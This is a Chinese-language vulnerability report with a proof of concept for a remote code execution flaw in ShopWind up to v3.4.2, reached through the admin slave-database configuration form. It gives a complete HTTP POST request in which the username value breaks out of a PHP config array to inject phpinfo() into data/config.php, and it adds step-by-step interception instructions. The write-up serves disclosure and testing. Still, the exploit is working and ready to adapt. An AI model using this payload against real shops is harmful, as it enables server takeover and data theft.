# ShopWind的RCE漏洞

## 描述

漏洞页面为"\backend\library\Database.php"

http://host/admin/db/slave.html

影响版本：ShopWind <= v3.4.2

ShopWind v3.4.2 在Database.php文件中存在一个RCE漏洞

[+]payload:
```sql
POST /admin/db/slave.html HTTP/1.1
Host: local.rapoo.top
Content-Length: 284
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://local.rapoo.top
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://local.rapoo.top/admin/db/index.html
Accept-Language: zh-CN,zh;q=0.9
Cookie: switchHistory=website%2Fdb; UM_distinctid=1803c2602eb210-05a24410a265d9-1734337f-1fa400-1803c2602ec659; bjui_theme=purple; XDEBUG_SESSION=PHPSTORM; CNZZDATA1618465=cnzz_eid%3D555001816-1650273840-%26ntime%3D1650346840; _csrf-frontend=371af4132d0a63bf3fd1cef592f81eb327b3777adef9c212fea509b4f4521de5a%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22ZHmjMt0Y09HQJ2MvIMYc2FgP3TEEQ17l%22%3B%7D; advanced-frontend=079naqu5qs1gid2vfc05euv481; advanced-backend=p78poo8n9hl27mks17hf2vlgll; _csrf-backend=ad56049615f6ba364b544685b88bf7aef7baeca4c875a1af3133961cccb509bfa%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22_csrf-backend%22%3Bi%3A1%3Bs%3A32%3A%22y-o088Wj2bIB0WpJf8fRaiplRoDM9rDq%22%3B%7D; goodsBrowseHistory=c28cb2b6cbbb56efe1b54af4962a1184b1ff4c069830e85977639ad55216dd9ba%3A2%3A%7Bi%3A0%3Bs%3A18%3A%22goodsBrowseHistory%22%3Bi%3A1%3Bs%3A2%3A%2226%22%3B%7D
Connection: close

host=localhost&port=3306&dbname=shopwind&username=root',phpinfo(),
        'password' => 'root',
        'attributes' => 
        array (
          2 => 10,
        ),
        'dsn' => 'mysql:host=localhost;port=3306;dbname=shopwind',
      ),
    ),
  ),
);/*&password=root
```

## 打开配置菜单

打开后台-网站-数据库-配置

![image](https://user-images.githubusercontent.com/54017627/168497678-13d554bf-ade5-4e7d-bdcd-9f340b46caab.png)

## 2.2 点击添加从属数据库

打开配置窗口后，随意填写内容

![image](https://user-images.githubusercontent.com/54017627/168497705-9d152d25-3582-415f-8c19-2ec003119ccd.png)

## 2.3 用burp捕获数据包

![image](https://user-images.githubusercontent.com/54017627/168497719-d706c54a-e4e2-4985-a59e-ab87b3131128.png)

## 2.4 将用户名字段的值更改为我们的POC

```sql
root',phpinfo(),
        'password' => 'root',
        'attributes' => 
        array (
          2 => 10,
        ),
        'dsn' => 'mysql:host=localhost;port=3306;dbname=shopwind',
      ),
    ),
  ),
);/*
```

![image](https://user-images.githubusercontent.com/54017627/168497747-a22ecaac-b0a0-4b93-bf49-510bd4bdd1cb.png)

## 2.5 成功

![image](https://user-images.githubusercontent.com/54017627/168497759-5d02e6c0-032d-44de-bfde-ebff79163592.png)

您还可以单独访问配置文件。路径如下

```sql
http://host/data/config.php
```

![image](https://user-images.githubusercontent.com/54017627/168497775-1a73fe70-f42d-4192-9a8e-a858ff0e92ee.png)
